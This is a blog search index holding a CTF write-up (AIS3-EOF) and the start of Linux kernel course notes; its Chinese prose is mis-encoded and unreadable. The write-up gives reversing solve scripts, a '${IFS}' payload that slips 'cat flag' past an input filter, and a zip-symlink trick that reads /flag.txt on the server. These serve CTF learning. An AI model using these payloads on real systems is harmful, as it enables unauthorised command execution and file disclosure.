<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>AIS3-EOF-2023</title>
    <link href="/2023/09/18/AIS3-EOF-2022/"/>
    <url>/2023/09/18/AIS3-EOF-2022/</url>
    
    <content type="html"><![CDATA[<h1 id="AIS3-EOF-2022"><a href="#AIS3-EOF-2022" class="headerlink" title="AIS3-EOF-2022"></a>AIS3-EOF-2022</h1><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Mumumu"><a href="#Mumumu" class="headerlink" title="Mumumu"></a>Mumumu</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">linux ELF<br><br>å¤§æ¦‚çœ‹ä¸€ä¸‹IDA<br>ä»–æœƒå…ˆè®€å–flagæª”æ¡ˆï¼Œåœ¨ç”¢å‡ºä¸€å€‹flag_enc<br>flagç‚º54å€‹å­—<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/SteHSPV.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">åŸå§‹flagå¯†æ–‡<br>6ct69GHt_A00utACToohy_0u0rb_9c5byF3A&#125;G515buR11_kL&#123;3rp_<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">æ§‹é€ payload<br>0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr<br>54å€‹å­— é©—è­‰å¾—å‡ºä¾†çš„flag_encç‚º<br>lYQon3OLXpWiCVmBGKHhZUMNRSaFqgADf0E2rJjPe765T8k914bcdI<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/vlIAuaG.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">å¾—å‡ºæ‰“äº‚å¾Œçš„offset<br>æ¥è‘—å¯«å‡ºä¸€å€‹list indexæ‰¾å‡ºå®ƒåŸæœ¬çš„ä½ç½®<br>ç„¶å¾Œå°‡flag_encæ­¸ä½ å³å¯æ‹¿åˆ°flag<br></code></pre></td></tr></table></figure><ul><li>exp.py<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs !">s = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr&quot;<br>enc = &#x27;lYQon3OLXpWiCVmBGKHhZUMNRSaFqgADf0E2rJjPe765T8k914bcdI&#x27;<br>flag_enc = &#x27;6ct69GHt_A00utACToohy_0u0rb_9c5byF3A&#125;G515buR11_kL&#123;3rp_&#x27;<br><br>flag = [0] * 54<br><br>for i in range(54):<br>    flag[i] = enc.index(s[i])<br><br>result = &quot;&quot;<br><br>for i in range(54):<br>    result += flag_enc[flag[i]]    <br><br>print(result)<br><br>#FLAG&#123;Rub1k5Cub3_To_Got0uH1t0r1_t0_cyb3rp5ych05_6A96A9&#125;<br></code></pre></td></tr></table></figure><img src="https://i.imgur.com/fDcCuiD.png"></li></ul><h3 id="Nekomatsuri"><a href="#Nekomatsuri" class="headerlink" title="Nekomatsuri"></a>Nekomatsuri</h3><ul><li>DIE å…ˆçœ‹<br><img src="https://i.imgur.com/V6w8yJg.png"></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">main é€²ä¾†å¾Œè·Ÿè‘—x64dbgè¿½<br>sub_140001550(&quot;%s&quot;,Source);<br>-&gt; scanf<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/AvmioqR.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs !">sub_140001AE0è§£ækernel32.dllè£¡çš„å‡½æ•¸<br>æ¥è‘—å‘¼å«CreateThread<br>v6 = CreateThread(0i64, 0i64, sub_1400015F2, &amp;qword_140015040, 0, v5);<br><br>é€™è£¡ä½¿ç”¨äº†Windows APIä¸­çš„ CreateThread å‡½æ•¸<br>å…¶ä¸­StartAddress function pointerï¼ŒæŒ‡å‘æ–°åŸ·è¡Œç·’ä¸­åŸ·è¡Œçš„å‡½æ•¸<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/loDQMB2.png"></p><ul><li>StartAddress <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs !">disammable ç™¼ç¾æœ‰å‘¼å«encrypt_rc4<br>ç¬¬ä¸€å€‹åƒæ•¸æŒ‡å‘åŠ å¯†çš„è¨˜æ†¶é«”pointer<br>å†ä¾†ç¬¬äºŒå€‹åƒæ•¸åŠ å¯†çš„å¤§å°<br>åœ¨returnæ™‚æœƒå›å‚³å¤§å°<br><br>//key :Ch1y0d4m0m0<br></code></pre></td></tr></table></figure><img src="https://i.imgur.com/YXFbQy3.png"></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">main rc4è§£å¯†çµæœç‚ºWinExecå­—ç¬¦ä¸²<br>æœƒå†åˆ©ç”¨WriteFileå¯«å…¥å­ç·šç¨‹çš„å¦ä¸€å€‹Sourceè£¡<br><br>//WinExec<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/xCLRvuB.png"><br><img src="https://i.imgur.com/CnLQz03.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">å†å¤šåŠ ä¸€å€‹åƒæ•¸å•Ÿå‹•ç¨‹å¼è®“ä»–é€²å…¥elseå­ç·šç¨‹<br>Sourceè¼¸å…¥ç‚ºWinExec<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/sF2tUkJ.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">é€²å…¥check_flag<br>è§€å¯Ÿencrypt_rc4è§£å¯†å¾Œçš„çµæœ<br>byte_7FF7ED6B00F6ç‚ºæˆ‘å€‘è¦çš„å¯†æ–‡65byte<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/1XUqnHN.png"><br><img src="https://i.imgur.com/JllTtZk.png"></p><ul><li><p>è§£å¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs !">æœ‰äº†flag_encè·Ÿkey<br>å¯ä»¥ç›´æ¥åšè§£å¯†<br><br>enc = &#x27;0525723D4F2F5701573B54213B51024D15421E51187A271A760943114311472D24507C263C772722262C7F7F0E777C37616D316F62693646353C203F396C363C50&#x27;<br>enc = bytes.fromhex(enc)<br>#print(c)<br><br>key = b&#x27;Ch1y0d4m0m0&#x27;<br><br>for i in range(len(enc)):<br>    flag = enc[i]<br>    flag = flag ^ key[i % len(key)]^i<br>    print(chr(flag), end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/n0E5sNm.png"></p></li><li><p>FLAG</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">FLAG&#123;Neko_ni_muragara_re_iinkai_4264abe1c58da2caa871f102e4c4aee3&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Washer"><a href="#Washer" class="headerlink" title="Washer"></a>Washer</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">é¡Œç›®æ‰“é–‹æœ‰è®€å¯«åŠŸèƒ½ä»¥åŠåŸ·è¡Œå¤–éƒ¨æª”æ¡ˆ<br>é¦–å…ˆæŸ¥çœ‹åŸå§‹ç¢¼<br></code></pre></td></tr></table></figure><ul><li>chal.c<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs !">#include &lt;fcntl.h&gt;<br>#include &lt;grp.h&gt;<br>#include &lt;signal.h&gt;<br>#include &lt;spawn.h&gt;<br>#include &lt;stdbool.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;unistd.h&gt;<br><br>void random_string(char *buf, int n) &#123;<br>  unsigned int seed;<br>  FILE *fp = fopen(&quot;/dev/random&quot;, &quot;r&quot;);<br>  fread(&amp;seed, sizeof(seed), 1, fp);<br>  fclose(fp);<br>  srand(seed);<br>  for (int i = 0; i &lt; n; ++i) &#123;<br>    buf[i] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;<br>        [rand() % 62];<br>  &#125;<br>  buf[n] = &#x27;\0&#x27;;<br>&#125;<br><br>void menu() &#123;<br>  puts(&quot;=== Menu ===&quot;);<br>  puts(&quot;1. Write Note&quot;);<br>  puts(&quot;2. Read Note&quot;);<br>  puts(&quot;3. Magic&quot;);<br>  puts(&quot;4. Exit&quot;);<br>&#125;<br><br>void spawn_prog(char *path) &#123;<br>  pid_t pid = 0;<br>  char *const argv[] = &#123;path, NULL&#125;;<br>  char *const envp[] = &#123;NULL&#125;;<br>  posix_spawn_file_actions_t file_actions;<br>  posix_spawn_file_actions_init(&amp;file_actions);<br>  posix_spawn_file_actions_addclose(&amp;file_actions, STDIN_FILENO);<br>  posix_spawn(&amp;pid, path, &amp;file_actions, NULL, argv, envp);<br>  sleep(1);<br>  kill(pid, SIGKILL);<br>&#125;<br><br>bool validate(char *buf) &#123;<br>  for (char *p = buf; *p != &#x27;\0&#x27;; p++) &#123;<br>    if (&#x27;$&#x27; &gt; *p || *p &gt; &#x27;&#125;&#x27;)<br>      return false;<br>  &#125;<br>  return true;<br>&#125;<br><br>int main() &#123;<br>  gid_t groups[] = &#123;65534&#125;;<br>  setgid(groups[0]);<br>  setgroups(1, groups);<br>  setuid(65534);<br>  setvbuf(stdout, NULL, _IONBF, 0);<br><br>  char name[7];<br>  random_string(name, 6);<br>  printf(&quot;Welcome, %s\n&quot;, name);<br><br>  char filename[12];<br>  sprintf(filename, &quot;/tmp/%s&quot;, name);<br>  close(<br>      open(filename, O_CREAT | O_TRUNC | O_RDWR, S_IRUSR | S_IWUSR | S_IXUSR));<br><br>  while (true) &#123;<br>    menu();<br><br>    int option;<br>    scanf(&quot;%d&quot;, &amp;option);<br>    if (option == 1) &#123;<br>      puts(&quot;Content:&quot;);<br><br>      char buf[100] = &#123;&#125;;<br>      scanf(&quot;%s&quot;, buf);<br><br>      if (validate(buf)) &#123;<br>        int fd = open(filename, O_CREAT | O_TRUNC | O_WRONLY,<br>                      S_IRUSR | S_IWUSR | S_IXUSR);<br>        write(fd, buf, strlen(buf));<br>        close(fd);<br>      &#125;<br>    &#125; else if (option == 2) &#123;<br>      char buf[100] = &#123;&#125;;<br>      int fd = open(filename, O_RDONLY);<br>      read(fd, buf, sizeof(buf));<br>      close(fd);<br><br>      printf(&quot;Content:\n%s\n&quot;, buf);<br>    &#125; else if (option == 3) &#123;<br>      puts(&quot;Curse:&quot;);<br><br>      char buf[100] = &#123;&#125;;<br>      scanf(&quot;%s&quot;, buf);<br>      spawn_prog(buf);<br>    &#125; else &#123;<br>      break;<br>    &#125;<br>  &#125;<br>  return 0;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs !">é¡Œç›®æµç¨‹å¤§è‡´ä¸Šæ˜¯å…ˆsetuidç‚ºnobody<br>æ¥è‘—é€²å…¥é¸å–®<br>æœƒåœ¨/tmpä¸‹ç”¢ç”Ÿå…­å€‹å­—å…ƒçš„éš¨æ©Ÿæª”æ¡ˆ<br>å¯ä»¥åˆ©ç”¨é¸å–®1å¯«å…¥æŒ‡ä»¤<br>2å¯ä»¥æ‹¿ä¾†æŸ¥çœ‹å…§å®¹<br>3å¯ä»¥åŸ·è¡Œå¤–éƒ¨æª”æ¡ˆ<br>å› æ­¤å¯ä»¥é€é1ä¾†å¯«æŒ‡ä»¤ 3ä¾†åŸ·è¡Œä»–<br><br>ä¸€é–‹å§‹å¡ä½æ˜¯å› ç‚ºæˆ‘ä»¥ç‚ºæˆ‘æ²’æœ‰æ¬Šé™å»è®€flag<br>å¾Œä¾†ç™¼ç¾æ˜¯å› ç‚ºæˆ‘ç©ºç™½æ²’æœ‰åƒé€²å»<br>æ²’æ³¨æ„åˆ°æœ‰é€™æ®µ &#x27;$&#x27; &gt; *p || *p &gt; &#x27;&#125;&#x27;<br>å› æ­¤ç°¡å–®ç”¨$&#123;IFS&#125;ç¹é<br></code></pre></td></tr></table></figure><ul><li><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs !">é¦–å…ˆwrite note<br><br>cat$&#123;IFS&#125;flag<br><br>åˆ©ç”¨3 çµ¦course<br>/tmp/aMbehd<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/FnkRnQU.png"></p></li><li><p>FLAG</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">FLAG&#123;Hmmm_s4nitiz3r_sh0uld_h3lp_right?ğŸ¤”&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Share"><a href="#Share" class="headerlink" title="Share"></a>Share</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs !">é¦–å…ˆè§€å¯Ÿé¡Œç›®src<br>åœ¨uploadé é¢å¯ä»¥ä¸Šå‚³ä¸€å€‹zipæª”<br>ä»–æœƒç”¨subprocess.runå»åšUnzip ä¸¦æ‰¾åˆ°index.html redirect<br><br>å¦‚æœæ²’æœ‰index.htmlä»–æœƒçˆ†å‡ºindex.html not found<br><br>å¯ä»¥ä½¿ç”¨zip symlinkæ”»æ“Šæ‰‹æ³•å–å¾—/flag.txt<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">ln -s /flag.txt index.html<br>zip -r --symlinks demo1.zip index.html<br><br>å› ç‚ºindex.htmlè¢«æˆ‘å€‘è¨­å®šè»Ÿé€£çµè‡³æ ¹ç›®éŒ„çš„flag.txt<br>å› æ­¤ç•¶ä¸Šå‚³å¾Œä»–è®€å–çš„index.htmlæœƒé€£çµè‡³/flag.txt å–å¾—flag<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/0gmUxAg.png"></p><ul><li>FLAG<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">FLAG&#123;w0W_y0U_r34L1y_kn0w_sYmL1nK!&#125;<br></code></pre></td></tr></table></figure><img src="https://i.imgur.com/npEsYXL.png"></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux Kernel Project</title>
    <link href="/2023/08/22/Linux-Kernel-Project/"/>
    <url>/2023/08/22/Linux-Kernel-Project/</url>
    
    <content type="html"><![CDATA[<h1 id="é–‹ç™¼ç’°å¢ƒå’Œç‰ˆæœ¬è³‡è¨Š"><a href="#é–‹ç™¼ç’°å¢ƒå’Œç‰ˆæœ¬è³‡è¨Š" class="headerlink" title="é–‹ç™¼ç’°å¢ƒå’Œç‰ˆæœ¬è³‡è¨Š"></a>é–‹ç™¼ç’°å¢ƒå’Œç‰ˆæœ¬è³‡è¨Š</h1><ul><li>Virtual Machine: VirtualBox</li><li>Linux Release: Fedora 6 (32-bit)<br>â€” <a href="http://archive.fedoraproject.org/pub/archive/fedora/linux/core/6/i386/iso/FC-6-i386-DVD.iso">http://archive.fedoraproject.org/pub/archive/fedora/linux/core/6/i386/iso/FC-6-i386-DVD.iso</a></li><li>Kernel Version: Linux-2.6.18(32-bit)<br>â€” <a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v2.6/linux-2.6.18.tar.gz">https://mirrors.edge.kernel.org/pub/linux/kernel/v2.6/linux-2.6.18.tar.gz</a><br>â€” <code>tar -zxvf linux-2.6.18.tar.gz -C /usr/src</code></li></ul><h1 id="å®‰è£fedora-Core-6-2-6-18"><a href="#å®‰è£fedora-Core-6-2-6-18" class="headerlink" title="å®‰è£fedora Core 6 2.6.18"></a>å®‰è£fedora Core 6 2.6.18</h1><p>Vmware 16 å®‰è£ä¸æˆåŠŸ..<br>ä½¿ç”¨virtualboxå®‰è£ éœ€é–‹å•ŸI&#x2F;O APIC</p><ul><li>I&#x2F;O APIC VirtualBox æ–‡æª”<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs !">é€™æ˜¯VirtualBoxæ–‡æª”ï¼š<br><br>å•Ÿç”¨I / O APIC<br><br>é«˜ç´šå¯ç·¨ç¨‹ä¸­æ–·æ§åˆ¶å™¨ï¼ˆAPICï¼‰æ˜¯ä¸€ç¨®è¼ƒæ–°çš„x86ç¡¬ä»¶åŠŸèƒ½ï¼Œè¿‘å¹´ä¾†å·²å–ä»£äº†èˆŠå¼çš„å¯ç·¨ç¨‹ä¸­æ–·æ§åˆ¶å™¨ï¼ˆPICï¼‰ã€‚é€šéI / O APICï¼Œæ“ä½œç³»çµ±å¯ä»¥ä½¿ç”¨16å€‹ä»¥ä¸Šçš„ä¸­æ–·è«‹æ±‚ï¼ˆIRQï¼‰ï¼Œå› æ­¤é¿å…äº†IRQå…±äº«ï¼Œå¾è€Œæé«˜äº†å¯é æ€§ã€‚<br><br>æ³¨æ„æ³¨æ„ï¼šå°æ–¼64ä½å®¢æˆ¶æ©Ÿæ“ä½œç³»çµ±ï¼Œå°¤å…¶æ˜¯Windows Vistaï¼Œéœ€è¦å•Ÿç”¨I / O APICã€‚å¦‚æœè¦åœ¨ä¸€å°è™›æ“¬æ©Ÿä¸­ä½¿ç”¨å¤šå€‹è™›æ“¬CPUï¼Œå‰‡ä¹Ÿéœ€è¦é€™æ¨£åšã€‚<br><br>ä½†æ˜¯ï¼Œå°æ–¼Windowsä»¥å¤–çš„æŸäº›æ“ä½œç³»çµ±ï¼Œå°I / O APICçš„è»Ÿä»¶æ”¯æŒä¸€ç›´ä¸å¯é ã€‚å¦å¤–ï¼Œä½¿ç”¨I / O APICæœƒç¨å¾®å¢åŠ è™›æ“¬åŒ–çš„é–‹éŠ·ï¼Œå› æ­¤æœƒç¨å¾®é™ä½å®¢æˆ¶æ©ŸOSçš„é€Ÿåº¦ã€‚<br><br>è­¦å‘Šæ³¨æ„ï¼šå¾Windows 2000é–‹å§‹çš„æ‰€æœ‰Windowsæ“ä½œç³»çµ±éƒ½æ ¹æ“šI / O APICæ˜¯å¦å¯ç”¨å®‰è£ä¸åŒçš„å…§æ ¸ã€‚å› æ­¤ï¼Œèˆ‡ACPIä¸€æ¨£ï¼Œåœ¨å®‰è£Windowsä¾†è³“æ“ä½œç³»çµ±ä¹‹å¾Œï¼Œä¸å¾—é—œé–‰I / O APICã€‚ä½†æ˜¯ï¼Œå®‰è£å¾Œå°‡å…¶æ‰“é–‹å°‡ç„¡æ•ˆã€‚<br></code></pre></td></tr></table></figure></li></ul><h1 id="Kernelç·¨è­¯"><a href="#Kernelç·¨è­¯" class="headerlink" title="Kernelç·¨è­¯"></a>Kernelç·¨è­¯</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs !"># make clean<br># make mrproper<br># cp /boot/config... ./.config<br># make bzImage<br># make modules<br># make modules_install<br># make install     <br></code></pre></td></tr></table></figure><h1 id="Virtual-Memoryæ¦‚å¿µ"><a href="#Virtual-Memoryæ¦‚å¿µ" class="headerlink" title="Virtual Memoryæ¦‚å¿µ"></a>Virtual Memoryæ¦‚å¿µ</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">åŸºæœ¬ä¸Šæ¯å€‹Processéƒ½æœ‰ç¨ç«‹çš„è™›æ“¬è¨˜æ†¶é«”ç©ºé–“ï¼Œ32ä½å…ƒæ©Ÿå™¨è™›æ“¬è¨˜æ†¶é«”å®šå€ç‚º4GBï¼Œ64ä½å…ƒæ©Ÿå™¨å¯é”åˆ°2^64 bytesã€‚<br></code></pre></td></tr></table></figure><ul><li><p>processç‚ºOSåˆ†é…ç³»çµ±è³‡æº(memory)çš„å–®ä½ï¼Œthreadç‚ºOSåˆ†é…CPU timeçš„å–®ä½</p></li><li><p>Process</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">ä¸€å€‹elf binaryæª”æ¡ˆåœ¨ disk ä¸Šå« user programï¼Œ loadé€²memory é–‹å§‹åŸ·è¡Œå¾Œå°±è®Šæˆ process<br>æœ‰è‡ªå·±çš„address space =&gt;code section, data section, bss sectionã€stackã€heap<br>Linux é€šå¸¸æŠŠprocessç•¶åšæ˜¯taskï¼ŒPCB (processing control block) é€šå¸¸ä¹Ÿç¨±ç‚º struct tast_struct<br></code></pre></td></tr></table></figure></li><li><p>thread:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">Thread è¢«ç¨±ç‚ºè¼•é‡ç´šprocessï¼Œå®ƒæ˜¯ç³»çµ±èª¿åº¦æœ€å°å–®ä½ï¼Œthreadèˆ‡processå·®åˆ¥åœ¨æ–¼processæœ‰ç¨ç«‹çš„è³‡æºç©ºé–“ï¼Œè€Œthreadå‰‡å…±äº«processçš„address<br>å…±äº«processçš„address space =&gt; code section, data section<br>threadæœ‰è‡ªå·±çš„program counter, cpu register, stack<br>Linux ä¸¦æ²’æœ‰ç‰¹å®šçš„data structureä¾†æ¨™ç¤ºthread or processï¼Œthreadèˆ‡processéƒ½ä½¿ç”¨processçš„PCB<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/vGHFff2.png"></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">Process and task_struct<br>Linuxç”¨task_structä¾†æè¿°ä¸€å€‹processï¼Œé€étask_struct-&gt;mm-&gt;mmapå¯ä»¥æ‰¾åˆ°vm_area_structï¼Œlinuxç”¨åˆ©ç”¨VMA(virtual memory area)ä¾†æè¿°æ¯å€‹segmentç‰¹æ€§ï¼Œå¤§å°<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/0vOXdsL.png"></p><ul><li>mm_sturct<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs !">struct mm_struct &#123;<br>    struct vm_area_struct * mmap;        /* list of VMAs */<br>    struct rb_root mm_rb;<br>    unsigned long mmap_base;        /* base of mmap area */<br>    unsigned long task_size;        /* size of task vm space */<br>    pgd_t * pgd;<br>    atomic_t mm_count;            /* How many references to &quot;struct mm_struct&quot; (users count as 1) */<br>    int map_count;                /* number of VMAs */<br><br>    unsigned long start_code, end_code, start_data, end_data;<br>    unsigned long start_brk, brk, start_stack;<br>    unsigned long arg_start, arg_end, env_start, env_end;<br><br>    struct file *exe_file;<br><br>    /* ... some code omitted ... */<br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><h1 id="ç·¨è­¯çµæœ"><a href="#ç·¨è­¯çµæœ" class="headerlink" title="ç·¨è­¯çµæœ"></a>ç·¨è­¯çµæœ</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">å¤§è‡´ä¸Šçš„æƒ³æ³•åœ¨kernel spaceçš„mm_structå–å¾—segment infoï¼Œ<br>å†å›å‚³åˆ°user space<br><br>dataã€bssã€codeã€libary segmentå…±äº«è¨˜æ†¶é«”<br>stackã€local storageã€heap segmentè¨˜æ†¶é«”å€å¡Šä¸ç›¸åŒ<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/NV1HwVb.png"><br><img src="https://i.imgur.com/ZAJRYnH.png"></p><h1 id="ç¨‹å¼ç¢¼"><a 